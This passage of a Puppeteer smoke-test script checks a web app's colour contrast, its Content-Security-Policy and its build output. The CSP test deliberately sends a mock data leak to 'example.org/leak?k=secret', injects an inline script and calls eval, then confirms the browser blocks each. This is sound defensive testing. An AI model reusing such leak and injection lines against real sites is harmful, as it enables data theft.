  const weak = text.map(([f, b]) => [f, b, ratio(val(f), val(b))]).filter(([, , r]) => r < 4.5)
  check(weak.length === 0, `contrast: all ${text.length} text/background pairs in the palette reach 4.5:1`, weak.map(([f, b, r]) => `${f} on ${b} ${r.toFixed(2)}`).join('; ') || `lowest ${Math.min(...text.map(([f, b]) => ratio(val(f), val(b)))).toFixed(2)}:1`)
  const ui = [['--focus', '--bg'], ['--focus', '--card'], ['--focus', '--well'], ['--control', '--card'], ['--control', '--well'], ['--control', '--bg']]
  const weakUi = ui.filter(([f]) => v[f]).map(([f, b]) => [f, b, ratio(val(f), val(b))]).filter(([, , r]) => r < 3)
  check(v['--control'] !== '' && weakUi.length === 0, 'contrast: focus ring and the borders of fields, selects, buttons and key choices reach 3:1', weakUi.map(([f, b, r]) => `${f} on ${b} ${r.toFixed(2)}`).join('; ') || `--control ${v['--control']}`)
}

// ---------- the policy ----------
async function cspRun(browser) {
  const { page } = await open(browser, { w: 1280 })
  const meta = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? '')
  const dirs = Object.fromEntries(meta.split(/;\s*/).filter(Boolean).map((d) => { const [k, ...rest] = d.trim().split(/\s+/); return [k, rest.join(' ')] }))
  check(dirs['connect-src'] === INDEXER_URL && dirs['default-src'] === "'none'" && dirs['script-src'] === "'self' 'wasm-unsafe-eval'", 'csp: the policy is in the page; connect-src allows only the indexer; default is none', meta)
  check(!/unsafe-inline|unsafe-eval|\*|data:|blob:/.test(meta.replace("'wasm-unsafe-eval'", '')), 'csp: no unsafe-inline, plain unsafe-eval, wildcard, data: or blob:')
  const r = await page.evaluate(async () => {
    const violations = []
    document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.violatedDirective} ${e.blockedURI}`))
    let outside
    try {
      await fetch('https://example.org/leak?k=secret', { mode: 'no-cors' })
      outside = 'allowed'
    } catch (e) {
      outside = `blocked (${e.name})`
    }
    const s = document.createElement('script')
    s.textContent = 'window.__injected = 1'
    document.head.append(s)
    const img = new Image()
    img.src = 'https://example.org/pixel.png'
    await new Promise((ok) => setTimeout(ok, 400))
    return { outside, injected: window.__injected === 1, violations }
  })
  // page.evaluate runs over the debugging protocol, which lets eval through by default; ask for the page's own policy to apply
  const cdp = await page.createCDPSession()
  const ev = await cdp.send('Runtime.evaluate', { expression: "eval('1+1')", allowUnsafeEvalBlockedByCSP: false })
  const evaled = ev.exceptionDetails ? `blocked (${(ev.exceptionDetails.exception?.description ?? ev.exceptionDetails.text).split('\n')[0].slice(0, 60)})` : `allowed ${ev.result.value}`
  check(r.outside.startsWith('blocked') && evaled.startsWith('blocked') && !r.injected, 'csp: negative controls are blocked by the browser: a fetch to another site, eval, an injected inline script', `${r.outside}; ${evaled}; injected=${r.injected}`)
  check(['connect-src', 'script-src', 'img-src'].every((d) => r.violations.some((x) => x.startsWith(d))), 'csp: the browser reported violations for each of them', r.violations.join(' | '))
  await page.close()
}

// ---------- the built files ----------
function staticChecks() {
  const html = readFileSync(join(DIST, 'index.html'), 'utf8')
  const refs = [...html.matchAll(/\b(?:src|href)="([^"]+)"/g)].map((m) => m[1])
  const rooted = refs.filter((u) => u.startsWith('/'))
  check(rooted.length === 0 && refs.some((u) => u.startsWith('./assets/')), 'build: asset paths are relative (works under /seance/)', rooted.join(', ') || refs.filter((u) => !u.startsWith('http')).join(' '))
  check(!/<script(?![^>]*\bsrc=)/i.test(html) && !/\sstyle=/i.test(html), 'build: no inline script or style in index.html')
  check(!existsSync(join(DIST, 'gate.html')) && existsSync(join(DIST, 'THIRD-PARTY-LICENSES.md')) && existsSync(join(DIST, 'favicon.svg')), 'build: no gate page shipped; third-party licence notices and favicon are')
  const allowed = new Set([INDEXER_HOST, new URL(EXPLORER_URL).host, 'ootle.tari.com', 'www.w3.org'])
  const found = new Map()
  const walkDir = (d) => {
    for (const n of readdirSync(d)) {
      const p = join(d, n)
      if (statSync(p).isDirectory()) walkDir(p)
      else if (!n.endsWith('.md')) for (const m of readFileSync(p, 'utf8').matchAll(/(?:https?:)?\/\/([a-z0-9][a-z0-9.-]*\.[a-z]{2,})/gi)) found.set(m[1].toLowerCase(), n)
    }
  }
  walkDir(DIST)
  const stray = [...found.keys()].filter((h) => !allowed.has(h))
  check(stray.length === 0, `build: every host named in the built files is expected (${[...found.keys()].join(', ')}); the w3.org one is the SVG namespace in the favicon`, stray.join(', '))
}

// ---------- main ----------
mkdirSync(EVID, { recursive: true })
if (!existsSync(join(DIST, 'index.html'))) throw new Error('dist/ is missing: run npm run build first')
const server = await serveDir(DIST, PORT, '/seance/')
const profile = (tag) => mkdtempSync(join(tmpdir(), `seance-smoke-${tag}-`))
const dirs = [profile('live'), profile('offline')]
const launch = (dir, extra = []) => puppeteer.launch({ executablePath: process.env.CHROMIUM ?? '/usr/bin/chromium', headless: true, userDataDir: dir, args: ['--no-sandbox', '--disable-dev-shm-usage', ...extra] })
const online = await launch(dirs[0])
// every host except this machine fails to resolve: the indexer is unreachable and nothing outside can be contacted
const offline = await launch(dirs[1], ['--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1'])
const scenario = async (name, fn) => {
  try {
    await fn()
  } catch (e) {
    failed++
    say(`FAIL scenario "${name}" crashed  [${e?.stack?.split('\n').slice(0, 3).join(' | ') ?? e}]`)
  }
}

say(`Seance smoke test of dist/ at ${BASE}, ${new Date().toISOString()}, ${await online.version()}`)
try {
  section('the built files')
  staticChecks()
  section('the block works (control for the recorded runs)')
  await scenario('block control', async () => {
    const p = await offline.newPage()
    const err = await p.goto(`${EXPLORER_URL}/`, { timeout: 15000 }).then(() => 'loaded', (e) => String(e.message).split(' at ')[0])
    check(err === 'net::ERR_NAME_NOT_RESOLVED', 'the offline browser cannot reach the explorer (so a page that works there needs no outside host)', err)
    await p.close()
  })
  section('palette contrast')
  await scenario('palette', () => paletteChecks(online))
  section('judge path, live indexer')
  for (const w of [1280, 390]) await scenario(`live ${w}`, () => walk(online, { mode: 'live', w }))
  section('judge path, recorded (fixture) mode, no network')
  for (const w of [1280, 390]) await scenario(`recorded ${w}`, () => walk(offline, { mode: 'recorded', w }))
  section('the indexer goes away')
  for (const w of [1280, 390]) await scenario(`fallback ${w}`, () => fallbackRun(offline, w))
  await scenario('hang', () => hangRun(online))
  section('keyboard, reduced motion, policy')
  await scenario('keyboard', () => keyboardRun(offline))
  await scenario('motion', () => motionRun(offline))
  await scenario('csp', () => cspRun(online))
} finally {
  await online.close()
  await offline.close()
  for (const d of dirs) rmSync(d, { recursive: true, force: true })
  server.closeAllConnections?.()
  server.close()
}
say(failed === 0 ? '\nRESULT: PASS' : `\nRESULT: FAIL (${failed})`)
writeFileSync(join(EVID, 'smoke.txt'), lines.join('\n') + '\n')
process.exit(failed === 0 ? 0 : 1)
